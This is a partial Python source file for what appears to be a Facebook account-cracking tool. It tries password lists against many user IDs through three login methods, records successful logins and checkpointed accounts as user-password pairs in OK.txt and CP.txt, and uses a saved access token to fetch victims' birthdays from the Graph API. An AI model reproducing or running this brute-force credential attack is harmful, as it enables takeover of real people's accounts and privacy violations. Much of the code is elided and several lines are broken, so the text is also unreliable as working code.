...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#CHARIS('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = CHARIS(self.apk).read().splitlines()
			CHARIS(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							CHARIS('[•] Result CP saved to CP.txt')
							CHARIS('\n\tCrack Processing...\n')
							CHARIS('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					CHARIS('\n01.) Metode b-api ')
					CHARIS('02.) Metode mbasic ')
					CHARIS('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			CHARIS('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			CHARIS(' [1] AKING Method 1 ')
			CHARIS(' [2] AKING Method 2  [ Pro ]')
			CHARIS(' [3] AKING Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [CHARIS] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				ua_xiaomi = CHARIS('agent.txt', 'r').read()
			...
			if "access_token" in p:
				CHARIS('\r\033[1;92m[Successful-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = CHARIS('login.txt').read()
					cp_ttl = Prof_Charsi('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					CHARIS('\r\033[1;91m[Checkpoint-CHARIS] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				CHARIS('\r\033[1;91m[Checkpoint-CHARIS] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				CHARIS('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = CHARIS('token.txt').read()
					cp_ttl = Prof_Charsi('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].CHARIS('\r\033[1;91m[Checkpoint-CHARIS] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				CHARIS('\r\033[1;92m[Successful-AKING] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
##    ## ##     ## ##     ## ##    ##  ##    ##  ##  
 ...
 [*]=============================================
    Author   : CHARIS
    Facebook : https://www.facebook.com/L1NK.C0PY.K4R.BSCK
    Team     : Charsi x PenDo
    Connect  : NexT TimE
 [*]=============================================
